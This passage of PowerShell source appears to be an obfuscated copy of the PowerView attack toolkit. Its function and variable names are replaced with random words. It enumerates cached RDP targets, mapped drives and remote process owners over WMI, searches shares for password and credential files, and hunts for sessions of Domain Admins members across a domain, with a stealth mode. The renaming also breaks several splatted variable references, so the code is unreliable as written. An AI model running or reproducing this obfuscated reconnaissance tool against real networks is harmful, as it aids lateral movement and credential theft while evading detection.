                Write-Warning "[fasteners] Error opening remote registry on $LqojfQUN99. Remote registry likely not enabled."
            }
        }
    }
}


function tobogganing {

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $HKU = 2147483651

            $PZIHGJhW99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $LqojfQUN99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $PZIHGJhW99['Credential'] = $ZiReXCQu99 }

            try {
                $Reg = Get-WmiObject @WmiArguments

                $jEucxVea99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($fIQsOIrv99 in $jEucxVea99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $OpgheHcJ99 = retrain -LGhgaolH99 $fIQsOIrv99 -ZiReXCQu99 $ZiReXCQu99
                        }
                        else {
                            $OpgheHcJ99 = retrain -LGhgaolH99 $fIQsOIrv99
                        }

                        $HmMCaQjh99 = $Reg.EnumValues($HKU,"$fIQsOIrv99\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($qkVisgqS99 in $HmMCaQjh99) {
                            if ($qkVisgqS99 -match 'MRU.*') {
                                $IGwLrfjK99 = $Reg.GetStringValue($HKU, "$fIQsOIrv99\Software\Microsoft\Terminal Server Client\Default", $qkVisgqS99).sValue

                                $wbclrxtR99 = New-Object PSObject
                                $wbclrxtR99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                                $wbclrxtR99 | Add-Member Noteproperty 'UserName' $OpgheHcJ99
                                $wbclrxtR99 | Add-Member Noteproperty 'UserSID' $fIQsOIrv99
                                $wbclrxtR99 | Add-Member Noteproperty 'TargetServer' $IGwLrfjK99
                                $wbclrxtR99 | Add-Member Noteproperty 'UsernameHint' $Null
                                $wbclrxtR99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $wbclrxtR99
                            }
                        }

                        $BJzKVVZq99 = $Reg.EnumKey($HKU,"$fIQsOIrv99\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($VmSwBdTN99 in $BJzKVVZq99) {

                            $eeHVFfWS99 = $Reg.GetStringValue($HKU, "$fIQsOIrv99\Software\Microsoft\Terminal Server Client\Servers\$VmSwBdTN99", 'UsernameHint').sValue

                            $wbclrxtR99 = New-Object PSObject
                            $wbclrxtR99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                            $wbclrxtR99 | Add-Member Noteproperty 'UserName' $OpgheHcJ99
                            $wbclrxtR99 | Add-Member Noteproperty 'UserSID' $fIQsOIrv99
                            $wbclrxtR99 | Add-Member Noteproperty 'TargetServer' $VmSwBdTN99
                            $wbclrxtR99 | Add-Member Noteproperty 'UsernameHint' $eeHVFfWS99
                            $wbclrxtR99.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $wbclrxtR99
                        }
                    }
                    catch {
                        Write-Verbose "[tobogganing] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[tobogganing] Error accessing $LqojfQUN99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function brazenness {

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            $HKU = 2147483651

            $PZIHGJhW99 = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $LqojfQUN99
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $PZIHGJhW99['Credential'] = $ZiReXCQu99 }

            try {
                $Reg = Get-WmiObject @WmiArguments

                $jEucxVea99 = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($fIQsOIrv99 in $jEucxVea99) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $OpgheHcJ99 = retrain -LGhgaolH99 $fIQsOIrv99 -ZiReXCQu99 $ZiReXCQu99
                        }
                        else {
                            $OpgheHcJ99 = retrain -LGhgaolH99 $fIQsOIrv99
                        }

                        $rHCeChBG99 = ($Reg.EnumKey($HKU, "$fIQsOIrv99\Network")).sNames

                        ForEach ($wkYNoqin99 in $rHCeChBG99) {
                            $jdDPYqRB99 = $Reg.GetStringValue($HKU, "$fIQsOIrv99\Network\$wkYNoqin99", 'ProviderName').sValue
                            $RswqTDcD99 = $Reg.GetStringValue($HKU, "$fIQsOIrv99\Network\$wkYNoqin99", 'RemotePath').sValue
                            $FvPwMLoT99 = $Reg.GetStringValue($HKU, "$fIQsOIrv99\Network\$wkYNoqin99", 'UserName').sValue
                            if (-not $OpgheHcJ99) { $OpgheHcJ99 = '' }

                            if ($RswqTDcD99 -and ($RswqTDcD99 -ne '')) {
                                $SqsxJKEA99 = New-Object PSObject
                                $SqsxJKEA99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                                $SqsxJKEA99 | Add-Member Noteproperty 'UserName' $OpgheHcJ99
                                $SqsxJKEA99 | Add-Member Noteproperty 'UserSID' $fIQsOIrv99
                                $SqsxJKEA99 | Add-Member Noteproperty 'DriveLetter' $wkYNoqin99
                                $SqsxJKEA99 | Add-Member Noteproperty 'ProviderName' $jdDPYqRB99
                                $SqsxJKEA99 | Add-Member Noteproperty 'RemotePath' $RswqTDcD99
                                $SqsxJKEA99 | Add-Member Noteproperty 'DriveUserName' $FvPwMLoT99
                                $SqsxJKEA99.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $SqsxJKEA99
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[brazenness] Error: $_"
                    }
                }
            }
            catch {
                Write-Warning "[brazenness] Error accessing $LqojfQUN99, likely insufficient permissions or firewall rules on host: $_"
            }
        }
    }
}


function anthropomorphism {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $wkNUqpQt99 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($LqojfQUN99 in $wkNUqpQt99) {
            try {
                $PZIHGJhW99 = @{
                    'ComputerName' = $wkNUqpQt99
                    'Class' = 'Win32_process'
                }
                if ($PSBoundParameters['Credential']) { $PZIHGJhW99['Credential'] = $ZiReXCQu99 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $Owner = $_.getowner();
                    $MYoEJgiY99 = New-Object PSObject
                    $MYoEJgiY99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99
                    $MYoEJgiY99 | Add-Member Noteproperty 'ProcessName' $_.ProcessName
                    $MYoEJgiY99 | Add-Member Noteproperty 'ProcessID' $_.ProcessID
                    $MYoEJgiY99 | Add-Member Noteproperty 'Domain' $Owner.Domain
                    $MYoEJgiY99 | Add-Member Noteproperty 'User' $Owner.User
                    $MYoEJgiY99.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $MYoEJgiY99
                }
            }
            catch {
                Write-Verbose "[anthropomorphism] Error enumerating remote processes on '$LqojfQUN99', access likely denied: $_"
            }
        }
    }
}


function congregates {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $AkfROeHj99 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $SmkTVNwX99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $ISmnkJsO99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $EqWZvqmg99,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $hTMCMOHq99,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $spzxCeQE99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $zfVcglFS99,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $jaWXlgci99,

        [Switch]
        $guhuHWYJ99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 =  @{
            'Recurse' = $True
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $AkfROeHj99
        }
        if ($PSBoundParameters['OfficeDocs']) {
            $xfOIjAld99['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($PSBoundParameters['FreshEXEs']) {
            $SmkTVNwX99 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $xfOIjAld99['Include'] = @('*.exe')
        }
        $xfOIjAld99['Force'] = -not $PSBoundParameters['ExcludeHidden']

        $rdBTKSlm99 = @{}

        function falling {
            [CmdletBinding()]Param([String]$Path)
            try {
                $YSoIquhS99 = [IO.File]::OpenWrite($Path)
                $YSoIquhS99.Close()
                $True
            }
            catch {
                $False
            }
        }
    }

    PROCESS {
        ForEach ($rSjMYowK99 in $Path) {
            if (($rSjMYowK99 -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $GhoLUzNa99 = (New-Object System.Uri($rSjMYowK99)).Host
                if (-not $rdBTKSlm99[$GhoLUzNa99]) {
                    crinkling -wkNUqpQt99 $GhoLUzNa99 -ZiReXCQu99 $ZiReXCQu99
                    $rdBTKSlm99[$GhoLUzNa99] = $True
                }
            }

            $xfOIjAld99['Path'] = $rSjMYowK99
            Get-ChildItem @SearcherArguments | ForEach-Object {
                $tqxxZBiO99 = $True
                if ($PSBoundParameters['ExcludeFolders'] -and ($_.PSIsContainer)) {
                    Write-Verbose "Excluding: $($_.FullName)"
                    $tqxxZBiO99 = $False
                }
                if ($SmkTVNwX99 -and ($_.LastAccessTime -lt $SmkTVNwX99)) {
                    $tqxxZBiO99 = $False
                }
                if ($PSBoundParameters['LastWriteTime'] -and ($_.LastWriteTime -lt $ISmnkJsO99)) {
                    $tqxxZBiO99 = $False
                }
                if ($PSBoundParameters['CreationTime'] -and ($_.CreationTime -lt $EqWZvqmg99)) {
                    $tqxxZBiO99 = $False
                }
                if ($PSBoundParameters['CheckWriteAccess'] -and (-not (falling -Path $_.FullName))) {
                    $tqxxZBiO99 = $False
                }
                if ($tqxxZBiO99) {
                    $ZbHTWtfE99 = @{
                        'Path' = $_.FullName
                        'Owner' = $((Get-Acl $_.FullName).Owner)
                        'LastAccessTime' = $_.LastAccessTime
                        'LastWriteTime' = $_.LastWriteTime
                        'CreationTime' = $_.CreationTime
                        'Length' = $_.Length
                    }
                    $PEHryMYh99 = New-Object -TypeName PSObject -Property $ZbHTWtfE99
                    $PEHryMYh99.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $PEHryMYh99
                }
            }
        }
    }

    END {
        $rdBTKSlm99.Keys | eraser
    }
}



function uterus {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [String[]]
        $wkNUqpQt99,

        [Parameter(Position = 1, Mandatory = $True)]
        [System.Management.Automation.ScriptBlock]
        $atfuqJht99,

        [Parameter(Position = 2)]
        [Hashtable]
        $tUtdHhZX99,

        [Int]
        [ValidateRange(1,  100)]
        $egZrjTFJ99 = 20,

        [Switch]
        $kQKVUzth99
    )

    BEGIN {
        $tztWxavU99 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()

        $tztWxavU99.ApartmentState = [System.Threading.ApartmentState]::STA

        if (-not $kQKVUzth99) {
            $tfWcRBcR99 = Get-Variable -Scope 2

            $BWJRWMVZ99 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')

            ForEach ($Var in $tfWcRBcR99) {
                if ($BWJRWMVZ99 -NotContains $Var.Name) {
                $tztWxavU99.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $Var.name,$Var.Value,$Var.description,$Var.options,$Var.attributes))
                }
            }

            ForEach ($SRGZpEhN99 in (Get-ChildItem Function:)) {
                $tztWxavU99.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $SRGZpEhN99.Name, $SRGZpEhN99.Definition))
            }
        }


        $Pool = [RunspaceFactory]::CreateRunspacePool(1, $egZrjTFJ99, $tztWxavU99, $Host)
        $Pool.Open()

        $RotDAwGI99 = $Null
        ForEach ($M in [PowerShell].GetMethods() | Where-Object { $_.Name -eq 'BeginInvoke' }) {
            $LLTftLui99 = $M.GetParameters()
            if (($LLTftLui99.Count -eq 2) -and $LLTftLui99[0].Name -eq 'input' -and $LLTftLui99[1].Name -eq 'output') {
                $RotDAwGI99 = $M.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $Jobs = @()
        $wkNUqpQt99 = $wkNUqpQt99 | Where-Object {$_ -and $_.Trim()}
        Write-Verbose "[uterus] Total number of hosts: $($wkNUqpQt99.count)"

        if ($egZrjTFJ99 -ge $wkNUqpQt99.Length) {
            $egZrjTFJ99 = $wkNUqpQt99.Length
        }
        $slJfkQre99 = [Int]($wkNUqpQt99.Length/$egZrjTFJ99)
        $yzIYAWdQ99 = @()
        $Start = 0
        $End = $slJfkQre99

        for($i = 1; $i -le $egZrjTFJ99; $i++) {
            $List = New-Object System.Collections.ArrayList
            if ($i -eq $egZrjTFJ99) {
                $End = $wkNUqpQt99.Length
            }
            $List.AddRange($wkNUqpQt99[$Start..($End-1)])
            $Start += $slJfkQre99
            $End += $slJfkQre99
            $yzIYAWdQ99 += @(,@($List.ToArray()))
        }

        Write-Verbose "[uterus] Total number of threads/partitions: $egZrjTFJ99"

        ForEach ($NHWHtWHA99 in $yzIYAWdQ99) {
            $OTRRlyGE99 = [PowerShell]::Create()
            $OTRRlyGE99.runspacepool = $Pool

            $Null = $OTRRlyGE99.AddScript($atfuqJht99).AddParameter('ComputerName', $NHWHtWHA99)
            if ($tUtdHhZX99) {
                ForEach ($Param in $tUtdHhZX99.GetEnumerator()) {
                    $Null = $OTRRlyGE99.AddParameter($Param.Name, $Param.Value)
                }
            }

            $BjYCzrxj99 = New-Object Management.Automation.PSDataCollection[Object]

            $Jobs += @{
                PS = $OTRRlyGE99
                Output = $BjYCzrxj99
                Result = $RotDAwGI99.Invoke($OTRRlyGE99, @($Null, [Management.Automation.PSDataCollection[Object]]$BjYCzrxj99))
            }
        }
    }

    END {
        Write-Verbose "[uterus] Threads executing"

        Do {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($Jobs | Where-Object { -not $_.Result.IsCompleted }).Count -gt 0)

        $CjMZbCjU99 = 100
        Write-Verbose "[uterus] Waiting $CjMZbCjU99 seconds for final cleanup..."

        for ($i=0; $i -lt $CjMZbCjU99; $i++) {
            ForEach ($Job in $Jobs) {
                $Job.Output.ReadAll()
                $Job.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $Pool.Dispose()
        Write-Verbose "[uterus] all threads completed"
    }
}


function eyeball {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        $wkNUqpQt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [String]
        $eYhHHjYI99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aLBeTPoV99,

        [ValidateNotNullOrEmpty()]
        [String]
        $fTvmLSVQ99,

        [Alias('Unconstrained')]
        [Switch]
        $zRqPGeGF99,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $hhyeAfOa99,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $MFXSjlPv99,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $qEkuFkiO99,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $tcefOwYo99,

        [ValidateNotNullOrEmpty()]
        [String]
        $tpoFORKS99,

        [ValidateNotNullOrEmpty()]
        [String]
        $vDIOaaYt99,

        [ValidateNotNullOrEmpty()]
        [String]
        $aDAKSwxN99,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $OMxvPLlz99 = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $BQpkcsAN99,

        [Alias('AllowDelegation')]
        [Switch]
        $yuJaUJkv99,

        [Switch]
        $YMUmbxod99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $XQLnuWbD99,

        [ValidateRange(1, 10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $uPQrThoX99 = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $zntnXHqk99,

        [Switch]
        $HmpPrHTL99,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $XhaoKhIl99 = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $egZrjTFJ99 = 20
    )

    BEGIN {

        $ZotlnKrB99 = @{
            'Properties' = 'dnshostname'
        }
        if ($PSBoundParameters['Domain']) { $ZotlnKrB99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['ComputerDomain']) { $ZotlnKrB99['Domain'] = $eYhHHjYI99 }
        if ($PSBoundParameters['ComputerLDAPFilter']) { $ZotlnKrB99['LDAPFilter'] = $aLBeTPoV99 }
        if ($PSBoundParameters['ComputerSearchBase']) { $ZotlnKrB99['SearchBase'] = $fTvmLSVQ99 }
        if ($PSBoundParameters['Unconstrained']) { $ZotlnKrB99['Unconstrained'] = $gxCjQSqn99 }
        if ($PSBoundParameters['ComputerOperatingSystem']) { $ZotlnKrB99['OperatingSystem'] = $DfPrQYoc99 }
        if ($PSBoundParameters['ComputerServicePack']) { $ZotlnKrB99['ServicePack'] = $kKsiFEfu99 }
        if ($PSBoundParameters['ComputerSiteName']) { $ZotlnKrB99['SiteName'] = $ZBmuuCEe99 }
        if ($PSBoundParameters['Server']) { $ZotlnKrB99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $ZotlnKrB99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $ZotlnKrB99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $ZotlnKrB99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $ZotlnKrB99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $ZotlnKrB99['Credential'] = $ZiReXCQu99 }

        $nJXaFCNO99 = @{
            'Properties' = 'samaccountname'
        }
        if ($PSBoundParameters['UserIdentity']) { $nJXaFCNO99['Identity'] = $tcefOwYo99 }
        if ($PSBoundParameters['Domain']) { $nJXaFCNO99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['UserDomain']) { $nJXaFCNO99['Domain'] = $tpoFORKS99 }
        if ($PSBoundParameters['UserLDAPFilter']) { $nJXaFCNO99['LDAPFilter'] = $vDIOaaYt99 }
        if ($PSBoundParameters['UserSearchBase']) { $nJXaFCNO99['SearchBase'] = $aDAKSwxN99 }
        if ($PSBoundParameters['UserAdminCount']) { $nJXaFCNO99['AdminCount'] = $BQpkcsAN99 }
        if ($PSBoundParameters['UserAllowDelegation']) { $nJXaFCNO99['AllowDelegation'] = $yuJaUJkv99 }
        if ($PSBoundParameters['Server']) { $nJXaFCNO99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $nJXaFCNO99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $nJXaFCNO99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $nJXaFCNO99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $nJXaFCNO99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $nJXaFCNO99['Credential'] = $ZiReXCQu99 }

        $OMilugXw99 = @()

        if ($PSBoundParameters['ComputerName']) {
            $OMilugXw99 = @($wkNUqpQt99)
        }
        else {
            if ($PSBoundParameters['Stealth']) {
                Write-Verbose "[eyeball] Stealth enumeration using source: $XhaoKhIl99"
                $yvFCShBq99 = New-Object System.Collections.ArrayList

                if ($XhaoKhIl99 -match 'File|All') {
                    Write-Verbose '[eyeball] Querying for file servers'
                    $VKBSeOWS99 = @{}
                    if ($PSBoundParameters['Domain']) { $VKBSeOWS99['Domain'] = $XQOKQXGr99 }
                    if ($PSBoundParameters['ComputerDomain']) { $VKBSeOWS99['Domain'] = $eYhHHjYI99 }
                    if ($PSBoundParameters['ComputerSearchBase']) { $VKBSeOWS99['SearchBase'] = $fTvmLSVQ99 }
                    if ($PSBoundParameters['Server']) { $VKBSeOWS99['Server'] = $VmSwBdTN99 }
                    if ($PSBoundParameters['SearchScope']) { $VKBSeOWS99['SearchScope'] = $YtWADKZe99 }
                    if ($PSBoundParameters['ResultPageSize']) { $VKBSeOWS99['ResultPageSize'] = $JYnIcwBJ99 }
                    if ($PSBoundParameters['ServerTimeLimit']) { $VKBSeOWS99['ServerTimeLimit'] = $fEdVcXRd99 }
                    if ($PSBoundParameters['Tombstone']) { $VKBSeOWS99['Tombstone'] = $uomKXjrL99 }
                    if ($PSBoundParameters['Credential']) { $VKBSeOWS99['Credential'] = $ZiReXCQu99 }
                    $YolOmjAL99 = moonshots @FileServerSearcherArguments
                    if ($YolOmjAL99 -isnot [System.Array]) { $YolOmjAL99 = @($YolOmjAL99) }
                    $yvFCShBq99.AddRange( $YolOmjAL99 )
                }
                if ($XhaoKhIl99 -match 'DFS|All') {
                    Write-Verbose '[eyeball] Querying for DFS servers'
                }
                if ($XhaoKhIl99 -match 'DC|All') {
                    Write-Verbose '[eyeball] Querying for domain controllers'
                    $wSGpRmul99 = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $wSGpRmul99['Domain'] = $XQOKQXGr99 }
                    if ($PSBoundParameters['ComputerDomain']) { $wSGpRmul99['Domain'] = $eYhHHjYI99 }
                    if ($PSBoundParameters['Server']) { $wSGpRmul99['Server'] = $VmSwBdTN99 }
                    if ($PSBoundParameters['Credential']) { $wSGpRmul99['Credential'] = $ZiReXCQu99 }
                    $HHUnDcfU99 = Elysium @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($HHUnDcfU99 -isnot [System.Array]) { $HHUnDcfU99 = @($HHUnDcfU99) }
                    $yvFCShBq99.AddRange( $HHUnDcfU99 )
                }
                $OMilugXw99 = $yvFCShBq99.ToArray()
            }
            else {
                Write-Verbose '[eyeball] Querying for all computers in the domain'
                $OMilugXw99 = Rankine @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[eyeball] TargetComputers length: $($OMilugXw99.Length)"
        if ($OMilugXw99.Length -eq 0) {
            throw '[eyeball] No hosts found to enumerate'
        }

        if ($PSBoundParameters['Credential']) {
            $ynTRKzgD99 = $ZiReXCQu99.GetNetworkCredential().UserName
        }
        else {
            $ynTRKzgD99 = ([Environment]::UserName).ToLower()
        }

        if ($PSBoundParameters['ShowAll']) {
            $xHNtbWdb99 = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $xHNtbWdb99 = bobcats @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $khbopPBb99 = @{
                'Identity' = $OMxvPLlz99
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $khbopPBb99['Domain'] = $tpoFORKS99 }
            if ($PSBoundParameters['UserSearchBase']) { $khbopPBb99['SearchBase'] = $aDAKSwxN99 }
            if ($PSBoundParameters['Server']) { $khbopPBb99['Server'] = $VmSwBdTN99 }
            if ($PSBoundParameters['SearchScope']) { $khbopPBb99['SearchScope'] = $YtWADKZe99 }
            if ($PSBoundParameters['ResultPageSize']) { $khbopPBb99['ResultPageSize'] = $JYnIcwBJ99 }
            if ($PSBoundParameters['ServerTimeLimit']) { $khbopPBb99['ServerTimeLimit'] = $fEdVcXRd99 }
            if ($PSBoundParameters['Tombstone']) { $khbopPBb99['Tombstone'] = $uomKXjrL99 }
            if ($PSBoundParameters['Credential']) { $khbopPBb99['Credential'] = $ZiReXCQu99 }
            $xHNtbWdb99 = pinup @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[eyeball] TargetUsers length: $($xHNtbWdb99.Length)"
        if ((-not $zntnXHqk99) -and ($xHNtbWdb99.Length -eq 0)) {
            throw '[eyeball] No users found to target'
        }

        $ESVuaknJ99 = {
            Param($wkNUqpQt99, $xHNtbWdb99, $ynTRKzgD99, $HmpPrHTL99, $LHlspMYk99)

            if ($LHlspMYk99) {
                $Null = sinfulness -LHlspMYk99 $LHlspMYk99 -Quiet
            }

            ForEach ($baXLhAGw99 in $wkNUqpQt99) {
                $Up = Test-Connection -Count 1 -Quiet -wkNUqpQt99 $baXLhAGw99
                if ($Up) {
                    $vtlhDSor99 = fenced -wkNUqpQt99 $baXLhAGw99
                    ForEach ($moUrjCze99 in $vtlhDSor99) {
                        $OpgheHcJ99 = $moUrjCze99.UserName
                        $CName = $moUrjCze99.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        if (($OpgheHcJ99) -and ($OpgheHcJ99.Trim() -ne '') -and ($OpgheHcJ99 -notmatch $ynTRKzgD99) -and ($OpgheHcJ99 -notmatch '\$$')) {

                            if ( (-not $xHNtbWdb99) -or ($xHNtbWdb99 -contains $OpgheHcJ99)) {
                                $QjuQctNC99 = New-Object PSObject
                                $QjuQctNC99 | Add-Member Noteproperty 'UserDomain' $Null
                                $QjuQctNC99 | Add-Member Noteproperty 'UserName' $OpgheHcJ99
                                $QjuQctNC99 | Add-Member Noteproperty 'ComputerName' $baXLhAGw99
                                $QjuQctNC99 | Add-Member Noteproperty 'SessionFrom' $CName

                                try {
                                    $spZtXQAt99 = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $QjuQctNC99 | Add-Member NoteProperty 'SessionFromName' $spZtXQAt99
                                }
                                catch {
                                    $QjuQctNC99 | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                if ($YMUmbxod99) {
                                    $Admin = (maimed -wkNUqpQt99 $CName).IsAdmin
